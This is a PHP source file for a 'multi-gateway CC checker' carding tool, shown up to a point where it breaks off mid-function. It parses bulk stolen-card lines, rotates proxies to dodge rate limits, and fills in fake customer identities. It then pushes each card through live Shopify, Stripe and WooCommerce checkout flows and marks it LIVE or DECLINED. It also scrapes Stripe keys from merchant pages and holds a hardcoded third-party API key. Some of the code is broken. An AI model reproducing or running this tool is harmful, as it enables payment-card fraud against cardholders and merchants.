<?php
/**
 * HIT.PHP - Advanced Multi-Gateway CC Checker
 * 
 * ✨ FEATURES:
 * - 50+ Payment Gateway Detection (Shopify, Stripe, WooCommerce, PayPal, etc.)
 * - Complete Shopify Payment Flow (from autosh.php)
 * - Stripe Payment Processing
 * - WooCommerce Integration
 * - Advanced Proxy Rotation with Rate Limiting
 * - Real JSON Payment Requests
 * - Bulk CC Checking Support
 * - Session & Token Management
 * - Analytics & Reporting
 * - Captcha Detection & Handling
 * 
 * @version 3.0 - Advanced Edition
 */

error_reporting(E_ALL & ~E_DEPRECATED);
@set_time_limit(300);

if (!extension_loaded('curl')) {
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'error' => 'cURL extension not enabled']);
    exit;
}

$start_time = microtime(true);

// Load dependencies (with error handling)
$required_files = ['ProxyManager.php', 'ho.php'];
foreach ($required_files as $file) {
    if (!file_exists(__DIR__ . '/' . $file)) {
        die("Error: Required file $file not found");
    }
    require_once __DIR__ . '/' . $file;
}

// Optional dependencies
$optional_files = ['AutoProxyFetcher.php', 'ProxyAnalytics.php', 'TelegramNotifier.php'];
foreach ($optional_files as $file) {
    if (file_exists(__DIR__ . '/' . $file)) {
        require_once __DIR__ . '/' . $file;
    }
}

// Initialize systems
$agent = new userAgent();
$ua = $agent->generate('windows');

$pm = new ProxyManager(__DIR__ . '/hit_proxy_log.txt');
$proxy_count = file_exists(__DIR__ . '/ProxyList.txt') ? $pm->loadFromFile(__DIR__ . '/ProxyList.txt') : 0;

$analytics = class_exists('ProxyAnalytics') ? new ProxyAnalytics() : null;
$telegram = class_exists('TelegramNotifier') ? new TelegramNotifier() : null;

// Configure rate limiting
$pm->setRateLimitDetection(true);
$pm->setAutoRotateOnRateLimit(true);
$pm->setRateLimitCooldown(60);
$pm->setMaxRateLimitRetries(5);

$output_format = isset($_GET['format']) ? strtolower($_GET['format']) : 'html';
$debug = isset($_GET['debug']);
$ROTATE_PROXY = !isset($_GET['proxy']) && (!isset($_GET['rotate']) || $_GET['rotate'] !== '0');

// Import GatewayDetector from autosh.php
if (!class_exists('GatewayDetector')) {
    // Set a flag to prevent autosh.php from showing its form
    $_GET['_hit_import'] = '1';
    
    // Temporarily buffer output to prevent form display
    ob_start();
    @include_once __DIR__ . '/autosh.php';
    ob_end_clean();
    
    // If GatewayDetector still doesn't exist, create a dummy one
    if (!class_exists('GatewayDetector')) {
        class GatewayDetector {
            public static function detect($response, $url, $extra = []) {
                // Basic detection
                if (stripos($response, 'shopify') !== false) {
                    return ['name' => 'Shopify', 'supports_cards' => true];
                }
                if (stripos($response, 'stripe') !== false) {
                    return ['name' => 'Stripe', 'supports_cards' => true];
                }
                if (stripos($response, 'woocommerce') !== false) {
                    return ['name' => 'WooCommerce', 'supports_cards' => true];
                }
                return ['name' => 'Unknown', 'supports_cards' => false];
            }
            
            public static function detectAll($response, $url, $extra = []) {
                return [self::detect($response, $url, $extra)];
            }
            
            public static function unknown() {
                return ['name' => 'Unknown', 'supports_cards' => false];
            }
        }
    }
}

// Load address generation (optional)
if (file_exists(__DIR__ . '/add.php')) {
    require_once __DIR__ . '/add.php';
    $num_us = $randomAddress['numd'];
    $address_us = $randomAddress['address1'];
    $address = $num_us.' '.$address_us;
    $city_us = $randomAddress['city'];
    $state_us = $randomAddress['state'];
    $zip_us = $randomAddress['zip'];
} else {
    // Default US address
    $num_us = '350';
    $address_us = '5th Ave';
    $address = '350 5th Ave';
    $city_us = 'New York';
    $state_us = 'NY';
    $zip_us = '10118';
}

if (file_exists(__DIR__ . '/no.php')) {
    require_once __DIR__ . '/no.php';
    $areaCode = $areaCodes[array_rand($areaCodes)];
    $phone = sprintf("+1%d%03d%04d", $areaCode, rand(200, 999), rand(1000, 9999));
} else {
    // Default phone
    $phone = '+12125551234';
}

// ============================================
// HELPER FUNCTIONS
// ============================================

function flow_user_agent(): string {
    static $ua = null;
    if ($ua === null) {
        $uaGen = new userAgent();
        $ua = $uaGen->generate('windows');
    }
    return $ua;
}

function find_between($content, $start, $end) {
    $startPos = strpos($content, $start);
    if ($startPos === false) return '';
    $startPos += strlen($start);
    $endPos = strpos($content, $end, $startPos);
    if ($endPos === false) return '';
    return substr($content, $startPos, $endPos - $startPos);
}

function runtime_cfg(): array {
    static $cache = null;
    if ($cache !== null) return $cache;
    
    $cto = isset($_GET['cto']) ? max(1, (int)$_GET['cto']) : 5;
    $to  = isset($_GET['to'])  ? max(3, (int)$_GET['to'])  : 15;
    $slp = isset($_GET['sleep']) ? max(0, (int)$_GET['sleep']) : 0;
    $v4  = isset($_GET['v4']) ? (bool)$_GET['v4'] : true;
    
    $cache = ['cto'=>$cto,'to'=>$to,'sleep'=>$slp,'v4'=>$v4];
    return $cache;
}

function apply_common_timeouts($ch): void {
    $cfg = runtime_cfg();
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $cfg['cto']);
    curl_setopt($ch, CURLOPT_TIMEOUT, $cfg['to']);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    if ($cfg['v4'] && defined('CURL_IPRESOLVE_V4')) {
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    }
}

function extractOperationQueryFromFile(string $filename, string $operationName): ?string {
    $filepath = __DIR__ . '/' . $filename;
    
    // Try to load from jsonp.php using the helper function
    if ($filename === 'jsonp.php' && file_exists($filepath)) {
        @include_once $filepath;
        if (function_exists('getGraphQLQuery')) {
            return getGraphQLQuery($operationName);
        }
    }
    
    // Fallback: return default query
    return 'query Proposal { session { negotiate { result { sellerProposal { delivery { deliveryLines { availableDeliveryStrategies { handle amount { value { amount } } } } } payment { availablePaymentLines { paymentMethod { name } } } tax { totalTaxAmount { value { amount currencyCode } } } runningTotal { value { amount } } } } } } }';
}

function getMinimumPriceProductDetails(string $json): array {
    $data = json_decode($json, true);
    
    if (!is_array($data) || !isset($data['products']) || !is_array($data['products'])) {
        throw new Exception('Invalid JSON format or missing products');
    }

    $minPrice = null;
    $minPriceDetails = ['id' => null, 'price' => null, 'title' => null];

    foreach ($data['products'] as $product) {
        if (!isset($product['variants']) || !is_array($product['variants'])) continue;
        
        foreach ($product['variants'] as $variant) {
            if (!isset($variant['price'])) continue;
            $price = (float) $variant['price'];
            
            if ($price >= 0.01 && ($minPrice === null || $price < $minPrice)) {
                $minPrice = $price;
                $minPriceDetails = [
                    'id' => $variant['id'] ?? null,
                    'price' => $variant['price'] ?? null,
                    'title' => $product['title'] ?? null,
                ];
            }
        }
    }

    if ($minPrice === null) {
        throw new Exception('No products found with price >= 0.01');
    }

    return $minPriceDetails;
}

// ============================================
// CREDIT CARD PARSING
// ============================================

function parseCC($input) {
    $parts = explode('|', trim($input));
    if (count($parts) < 4) return null;
    
    $number = preg_replace('/\s+/', '', $parts[0]);
    $month = str_pad($parts[1], 2, '0', STR_PAD_LEFT);
    $year = $parts[2];
    $cvv = $parts[3];
    
    if (strlen($year) == 2) $year = '20' . $year;
    
    $sub_month = ltrim($month, '0');
    if ($sub_month === '') $sub_month = '0';
    
    return [
        'number' => $number,
        'month' => $month,
        'sub_month' => $sub_month,
        'year' => $year,
        'cvv' => $cvv,
        'brand' => detectBrand($number)
    ];
}

function detectBrand($number) {
    if (preg_match('/^4/', $number)) return 'Visa';
    if (preg_match('/^5[1-5]/', $number)) return 'Mastercard';
    if (preg_match('/^3[47]/', $number)) return 'Amex';
    if (preg_match('/^6(?:011|5)/', $number)) return 'Discover';
    return 'Unknown';
}

function validateLuhn($number) {
    $number = preg_replace('/\s+/', '', $number);
    $sum = 0;
    $alt = false;
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $n = intval($number[$i]);
        if ($alt) {
            $n *= 2;
            if ($n > 9) $n -= 9;
        }
        $sum += $n;
        $alt = !$alt;
    }
    return ($sum % 10 === 0);
}

// ============================================
// CUSTOMER DETAILS
// ============================================

function getCustomerDetails() {
    global $address, $city_us, $state_us, $zip_us, $phone;
    
    $input = array_merge($_GET, $_POST);
    
    // Check if user wants auto-generation
    $auto_generate = isset($input['auto_generate']) && $input['auto_generate'] === '1';
    
    if ($auto_generate) {
        // Generate random user
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resposta = curl_exec($ch);
        curl_close($ch);
        
        $firstname = find_between($resposta, '"first":"', '"') ?: 'John';
        $lastname = find_between($resposta, '"last":"', '"') ?: 'Smith';
        
        $serve_arr = array("gmail.com","yahoo.com","hotmail.com","outlook.com");
        $email = strtolower($firstname . '.' . $lastname . rand(100, 999) . '@' . $serve_arr[array_rand($serve_arr)]);
        
        return [
            'first_name' => $firstname,
            'last_name' => $lastname,
            'email' => $email,
            'phone' => $phone,
            'cardholder_name' => $firstname . ' ' . $lastname,
            'street_address' => $address,
            'city' => $city_us,
            'state' => $state_us,
            'postal_code' => $zip_us,
            'country' => 'US',
            'currency' => 'USD'
        ];
    }
    
    // Manual input validation
    $required = ['first_name', 'last_name', 'email', 'phone', 'street_address', 
                 'city', 'state', 'postal_code', 'country', 'currency'];
    
    $missing = [];
    foreach ($required as $field) {
        if (empty($input[$field])) {
            $missing[] = $field;
        }
    }
    
    if (!empty($missing)) {
        return ['error' => 'Missing required fields: ' . implode(', ', $missing)];
    }
    
    return [
        'first_name' => trim($input['first_name']),
        'last_name' => trim($input['last_name']),
        'email' => trim($input['email']),
        'phone' => trim($input['phone']),
        'cardholder_name' => !empty($input['cardholder_name']) ? trim($input['cardholder_name']) : 
                             trim($input['first_name'] . ' ' . $input['last_name']),
        'street_address' => trim($input['street_address']),
        'city' => trim($input['city']),
        'state' => trim($input['state']),
        'postal_code' => trim($input['postal_code']),
        'country' => strtoupper(trim($input['country'])),
        'currency' => strtoupper(trim($input['currency']))
    ];
}

// Get customer details
$customer = getCustomerDetails();

// If error in customer details and JSON format requested
if (isset($customer['error']) && $output_format === 'json') {
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'error' => $customer['error']]);
    exit;
}

// ============================================
// GET CARDS
// ============================================

$cards = [];
$cc_input = isset($_GET['cc']) ? $_GET['cc'] : (isset($_POST['cc']) ? $_POST['cc'] : '');

if (!empty($cc_input)) {
    $cc_lines = preg_split('/[\r\n;]+/', $cc_input);
    foreach ($cc_lines as $line) {
        $line = trim($line);
        if (empty($line)) continue;
        $card = parseCC($line);
        if ($card) $cards[] = $card;
    }
}

// Get site
$site = isset($_GET['site']) ? trim($_GET['site']) : (isset($_POST['site']) ? trim($_POST['site']) : '');
if ($site && !preg_match('/^https?:\/\//i', $site)) {
    $site = 'https://' . $site;
}

// ============================================
// ADVANCED SHOPIFY PAYMENT FLOW (from autosh.php)
// ============================================

function checkShopifyAdvanced($card, $customer, $site, $pm, $ua, $rotate_proxy, $debug) {
    $result = [
        'success' => false,
        'status' => 'PROCESSING',
        'message' => 'Shopify checkout processing...',
        'steps' => []
    ];
    
    $start = microtime(true);
    $maxRetries = 3;
    $retryCount = 0;
    
    try {
        $urlbase = $site;
        $domain = parse_url($urlbase, PHP_URL_HOST);
        $cookie = 'cookie_'.uniqid('', true).'.txt';
        
        // Step 1: Fetch products
        $result['steps'][] = 'Fetching products...';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlbase . '/products.json?limit=250');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        
        if ($rotate_proxy && $pm) {
            $proxy = $pm->getNextProxy(true);
            if ($proxy) $pm->applyCurlProxy($ch, $proxy);
        }
        
        $productsResponse = curl_exec($ch);
        curl_close($ch);
        
        $productDetails = getMinimumPriceProductDetails($productsResponse);
        $prodid = $productDetails['id'];
        $minPrice = $productDetails['price'];
        
        if (empty($prodid)) {
            $result['status'] = 'ERROR';
            $result['message'] = 'No products available';
            return $result;
        }
        
        $result['product_id'] = $prodid;
        $result['product_price'] = $minPrice;
        $result['steps'][] = "Selected product: \${$minPrice}";
        
        // Step 2: Add to cart
        $result['steps'][] = 'Adding to cart...';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/'.$prodid.':1');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        if ($rotate_proxy && $pm) {
            $proxy = $pm->getNextProxy(true);
            if ($proxy) $pm->applyCurlProxy($ch, $proxy);
        }
        
        $cartResponse = curl_exec($ch);
        curl_close($ch);
        
        // Extract session tokens
        $web_build_id = find_between($cartResponse, 'web_build_id&quot;:&quot;', '&quot;');
        $x_checkout_one_session_token = find_between($cartResponse, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
        $queue_token = find_between($cartResponse, 'queueToken&quot;:&quot;', '&quot;');
        $stable_id = find_between($cartResponse, 'stableId&quot;:&quot;', '&quot;');
        $paymentMethodIdentifier = find_between($cartResponse, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
        
        if (empty($web_build_id) || empty($x_checkout_one_session_token)) {
            $result['status'] = 'ERROR';
            $result['message'] = 'Failed to extract session tokens';
            return $result;
        }
        
        $result['steps'][] = 'Cart created, tokens extracted';
        
        // Extract checkout URL
        preg_match('/Location: ([^\r\n]+)/i', $cartResponse, $locationMatches);
        $checkouturl = $locationMatches[1] ?? '';
        $checkoutToken = '';
        if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
            $checkoutToken = $matches[1];
        }
        
        // Step 3: Submit card to Shopify
        $result['steps'][] = 'Submitting card to Shopify...';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'content-type: application/json',
            'origin: https://checkout.shopifycs.com',
            'referer: https://checkout.shopifycs.com/',
            'user-agent: ' . $ua
        ]);
        
        $cardPayload = json_encode([
            'credit_card' => [
                'number' => $card['number'],
                'month' => (int)$card['sub_month'],
                'year' => (int)$card['year'],
                'verification_value' => $card['cvv'],
                'start_month' => null,
                'start_year' => null,
                'issue_number' => '',
                'name' => $customer['cardholder_name']
            ],
            'payment_session_scope' => $domain
        ]);
        
        curl_setopt($ch, CURLOPT_POSTFIELDS, $cardPayload);
        
        if ($rotate_proxy && $pm) {
            $proxy = $pm->getNextProxy(true);
            if ($proxy) $pm->applyCurlProxy($ch, $proxy);
        }
        
        $cardResponse = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        $cardJson = json_decode($cardResponse, true);
        $cctoken = $cardJson['id'] ?? null;
        
        if (empty($cctoken)) {
            // Check for specific error messages
            if ($http_code === 422) {
                $result['status'] = 'DECLINED';
                $result['message'] = 'Card declined - Invalid card details';
            } elseif ($http_code === 429) {
                $result['status'] = 'RATE_LIMITED';
                $result['message'] = 'Rate limited by Shopify';
            } else {
                $result['status'] = 'DECLINED';
                $result['message'] = isset($cardJson['errors']) ? json_encode($cardJson['errors']) : 'Card validation failed';
            }
            return $result;
        }
        
        $result['card_token'] = $cctoken;
        $result['steps'][] = 'Card tokenized successfully';
        
        // Step 4: Create proposal with GraphQL
        $result['steps'][] = 'Creating checkout proposal...';
        
        // Get coordinates for address
        $geoaddress = urlencode("{$customer['street_address']}, {$customer['city']}");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://us1.locationiq.com/v1/search?key=pk.87eafaf1c832302b01301bf903d7897e&q={$geoaddress}&format=json");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $geocoding = curl_exec($ch);
        curl_close($ch);
        
        $geocoding_data = json_decode($geocoding, true);
        $lat = isset($geocoding_data[0]['lat']) ? (float)$geocoding_data[0]['lat'] : 40.7128;
        $lon = isset($geocoding_data[0]['lon']) ? (float)$geocoding_data[0]['lon'] : -74.0060;
        
        // Build GraphQL proposal query
        $proposalQuery = extractOperationQueryFromFile('jsonp.php', 'Proposal');
        
        $proposalPayload = [
            'query' => $proposalQuery,
            'variables' => [
                'sessionInput' => ['sessionToken' => $x_checkout_one_session_token],
                'queueToken' => $queue_token,
                'delivery' => [
                    'deliveryLines' => [[
                        'destination' => [
                            'partialStreetAddress' => [
                                'address1' => $customer['street_address'],
                                'city' => $customer['city'],
                                'countryCode' => $customer['country'],
                                'postalCode' => $customer['postal_code'],
                                'firstName' => $customer['first_name'],
                                'lastName' => $customer['last_name'],
                                'zoneCode' => $customer['state'],
                                'phone' => $customer['phone'],
                                'coordinates' => ['latitude' => $lat, 'longitude' => $lon]
                            ]
                        ]
                    ]]
                ],
                'payment' => [
                    'billingAddress' => [
                        'streetAddress' => [
                            'address1' => $customer['street_address'],
                            'city' => $customer['city'],
                            'countryCode' => $customer['country'],
                            'postalCode' => $customer['postal_code'],
                            'firstName' => $customer['first_name'],
                            'lastName' => $customer['last_name'],
                            'zoneCode' => $customer['state'],
                            'phone' => $customer['phone']
                        ]
                    ]
                ],
                'buyerIdentity' => [
                    'email' => $customer['email'],
                    'customer' => [
                        'presentmentCurrency' => $customer['currency'],
                        'countryCode' => $customer['country']
                    ]
                ]
            ],
            'operationName' => 'Proposal'
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=Proposal');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($proposalPayload));
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'content-type: application/json',
            'user-agent: ' . $ua,
            'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
            'x-checkout-web-build-id: ' . $web_build_id,
            'x-checkout-web-source-id: ' . $checkoutToken
        ]);
        
        if ($rotate_proxy && $pm) {
            $proxy = $pm->getNextProxy(true);
            if ($proxy) $pm->applyCurlProxy($ch, $proxy);
        }
        
        $proposalResponse = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        $decoded = json_decode($proposalResponse);
        
        if (isset($decoded->errors)) {
            $errorMsg = $decoded->errors[0]->message ?? 'GraphQL error';
            $result['status'] = 'ERROR';
            $result['message'] = 'Proposal failed: ' . $errorMsg;
            return $result;
        }
        
        // Check if proposal succeeded
        if (isset($decoded->data->session->negotiate->result->sellerProposal)) {
            $proposal = $decoded->data->session->negotiate->result->sellerProposal;
            
            // Extract gateway info
            $gateway = 'Unknown';
            if (!empty($proposal->payment->availablePaymentLines)) {
                foreach ($proposal->payment->availablePaymentLines as $paymentLine) {
                    if (isset($paymentLine->paymentMethod->name)) {
                        $gateway = $paymentLine->paymentMethod->name;
                        break;
                    }
                }
            }
            
            $result['gateway'] = $gateway;
            $result['success'] = true;
            $result['status'] = 'LIVE';
            $result['message'] = "Card accepted - Proposal created successfully";
            $result['steps'][] = "✓ Checkout proposal accepted by gateway: {$gateway}";
            
            // Extract amounts
            if (isset($proposal->runningTotal->value->amount)) {
                $result['total_amount'] = $proposal->runningTotal->value->amount;
            }
            if (isset($proposal->tax->totalTaxAmount->value->amount)) {
                $result['tax_amount'] = $proposal->tax->totalTaxAmount->value->amount;
            }
            
        } else {
            $result['status'] = 'DECLINED';
            $result['message'] = 'Proposal declined by gateway';
        }
        
        // Cleanup cookie file
        if (file_exists($cookie)) @unlink($cookie);
        
    } catch (Exception $e) {
        $result['status'] = 'ERROR';
        $result['message'] = 'Exception: ' . $e->getMessage();
    }
    
    $result['response_time'] = round((microtime(true) - $start) * 1000);
    return $result;
}

// ============================================
// STRIPE PAYMENT CHECK
// ============================================

function checkStripe($card, $customer, $site, $initial_response, $pm, $ua, $rotate_proxy, $debug) {
    $result = [
        'success' => false,
        'status' => 'PROCESSING',
        'message' => 'Stripe checkout processing...'
    ];
    
    try {
        // Extract Stripe publishable key
        $pk_key = find_between($initial_response, 'pk_live_', '"');
        if (empty($pk_key)) {
            $pk_key = find_between($initial_response, 'pk_test_', '"');
        }
        
        if (empty($pk_key)) {
            $result['status'] = 'ERROR';
            $result['message'] = 'Could not extract Stripe publishable key';
            return $result;
        }
        
        $stripe_key = (strpos($pk_key, 'pk_live_') === 0 ? '' : (strpos($pk_key, 'pk_test_') === 0 ? '' : 'pk_live_')) . $pk_key;
        
        // Create Stripe token
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'card[number]' => $card['number'],
            'card[exp_month]' => $card['month'],
            'card[exp_year]' => $card['year'],
            'card[cvc]' => $card['cvv'],
            'card[name]' => $customer['cardholder_name'],
            'card[address_line1]' => $customer['street_address'],
            'card[address_city]' => $customer['city'],
            'card[address_state]' => $customer['state'],
            'card[address_zip]' => $customer['postal_code'],
            'card[address_country]' => $customer['country']
        ]));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Authorization: Bearer ' . $stripe_key,
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: ' . $ua
        ]);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        if ($rotate_proxy && $pm) {
            $proxy = $pm->getNextProxy(true);
            if ($proxy) $pm->applyCurlProxy($ch, $proxy);
        }
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        $json = json_decode($response, true);
        
        if ($http_code === 200 && isset($json['id'])) {
            $result['success'] = true;
            $result['status'] = 'LIVE';
            $result['message'] = 'Card accepted by Stripe (token created)';
            $result['stripe_token'] = $json['id'];
            $result['card_id'] = $json['card']['id'] ?? null;
        } else {
            $result['status'] = 'DECLINED';
            $error = $json['error']['message'] ?? 'Card declined';
            $result['message'] = $error;
            $result['decline_code'] = $json['error']['decline_code'] ?? null;
        }
        
    } catch (Exception $e) {
        $result['status'] = 'ERROR';
        $result['message'] = 'Stripe error: ' . $e->getMessage();
    }
    
    return $result;
}

// ============================================
// WOOCOMMERCE PAYMENT CHECK
// ============================================

function checkWooCommerce($card, $customer, $site, $initial_response, $pm, $ua, $rotate_proxy, $debug) {
    $result = [
        'success' => false,
        'status' => 'PROCESSING',
        'message' => 'WooCommerce checkout processing...'
    ];
    
    try {
        // Find WooCommerce checkout nonce
        $wc_nonce = find_between($initial_response, 'woocommerce-process-checkout-nonce" value="', '"');
        
        if (empty($wc_nonce)) {
            $result['status' => 'ERROR';
            $result['message'] = 'Could not extract WooCommerce nonce';
            return $result;
        }
        
        // Find checkout URL
        $checkout_url = $site . '/wc-ajax/checkout';
        
        // Prepare checkout data
        $checkout_data = [
            'billing_first_name' => $customer['first_name'],
            'billing_last_name' => $customer['last_name'],
            'billing_email' => $customer['email'],
            'billing_phone' => $customer['phone'],
            'billing_address_1' => $customer['street_address'],
            'billing_city' => $customer['city'],
            'billing_state' => $customer['state'],
            'billing_postcode' => $customer['postal_code'],
            'billing_country' => $customer['country'],
            'payment_method' => 'stripe',
            'woocommerce-process-checkout-nonce' => $wc_nonce
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $checkout_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($checkout_data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: ' . $ua,
            'Referer: ' . $site
        ]);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        if ($rotate_proxy && $pm) {
            $proxy = $pm->getNextProxy(true);
            if ($proxy) $pm->applyCurlProxy($ch, $proxy);
        }
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        $json = json_decode($response, true);
        
        if (isset($json['result']) && $json['result'] === 'success') {
            $result['success'] = true;
            $result['status'] = 'LIVE';
            $result['message'] = 'WooCommerce checkout initiated successfully';
        } else {
            $result['status'] = 'DECLINED';
            $result['message'] = $json['messages'] ?? 'Checkout failed';
        }
        
    } catch (Exception $e) {
        $result['status'] = 'ERROR';
        $result['message'] = 'WooCommerce error: ' . $e->getMessage();
    }
    
    return $result;
}

// ============================================
// MAIN CHECK FUNCTION
// ============================================

function performGatewayCheck($card, $customer, $site, $pm, $ua, $rotate_proxy, $debug) {
    $result = [
        'success' => false,
        'card' => substr($card['number'], 0, 6) . '******' . substr($card['number'], -4),
        'brand' => $card['brand'],
        'customer' => [
            'name' => $customer['first_name'] . ' ' . $customer['last_name'],
            'email' => $customer['email'],
            'phone' => $customer['phone'],
            'address' => $customer['street_address'] . ', ' . $customer['city'] . ', ' . 
                        $customer['state'] . ' ' . $customer['postal_code'],
            'country' => $customer['country'],
            'currency' => $customer['currency']
        ],
        'site' => $site,
        'gateway' => 'Unknown',
        'message' => '',
        'response_time' => 0,
        'timestamp' => date('Y-m-d H:i:s')
    ];
    
    $start = microtime(true);
    
    try {
        // Validate card
        if (!validateLuhn($card['number'])) {
            $result['status'] = 'INVALID';
            $result['message'] = 'Card failed Luhn validation';
            return $result;
        }
        
        if (empty($site)) {
            $result['status'] = 'ERROR';
            $result['message'] = 'No site URL provided';
            return $result;
        }
        
        // Step 1: Fetch the site to detect gateway
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $site,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => $ua,
            CURLOPT_HTTPHEADER => [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.9'
            ]
        ]);
        
        if ($rotate_proxy && $pm) {
            $proxy = $pm->getNextProxy(true);
            if ($proxy) {
                $pm->applyCurlProxy($ch, $proxy);
                $result['proxy_used'] = $proxy['string'];
            }
        }
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($response === false || $http_code < 200 || $http_code >= 400) {
            $result['status'] = 'ERROR';
            $result['message'] = "Failed to fetch site (HTTP $http_code)";
            $result['response_time'] = round((microtime(true) - $start) * 1000);
            return $result;
        }
        
        // Step 2: Detect gateway
        $gateway_data = GatewayDetector::detect($response, $site);
        $result['gateway'] = $gateway_data['name'] ?? 'Unknown';
        $result['gateway_data'] = $gateway_data;
        
        // Step 3: Route to appropriate payment processor
        $gateway_lower = strtolower($result['gateway']);
        
        if (stripos($gateway_lower, 'shopify') !== false || stripos($site, 'myshopify.com') !== false) {
            // Shopify - Use advanced flow
            $payment_result = checkShopifyAdvanced($card, $customer, $site, $pm, $ua, $rotate_proxy, $debug);
            $result = array_merge($result, $payment_result);
            
        } elseif (stripos($gateway_lower, 'stripe') !== false) {
            // Stripe
            $payment_result = checkStripe($card, $customer, $site, $response, $pm, $ua, $rotate_proxy, $debug);
            $result = array_merge($result, $payment_result);
            
        } elseif (stripos($gateway_lower, 'woocommerce') !== false) {
            // WooCommerce
            $payment_result = checkWooCommerce($card, $customer, $site, $response, $pm, $ua, $rotate_proxy, $debug);
            $result = array_merge($result, $payment_result);
            
        } else {
            // Generic detection
            $result['status'] = 'DETECTED';
            $result['message'] = "Gateway detected: {$result['gateway']} - Implementation pending";
            $result['supports_cards'] = $gateway_data['supports_cards'] ?? false;
        }
        
        $result['response_time'] = round((microtime(true) - $start) * 1000);
        
    } catch (Exception $e) {
        $result['status'] = 'ERROR';
        $result['message'] = 'Exception: ' . $e->getMessage();
        $result['response_time'] = round((microtime(true) - $start) * 1000);
    }
    
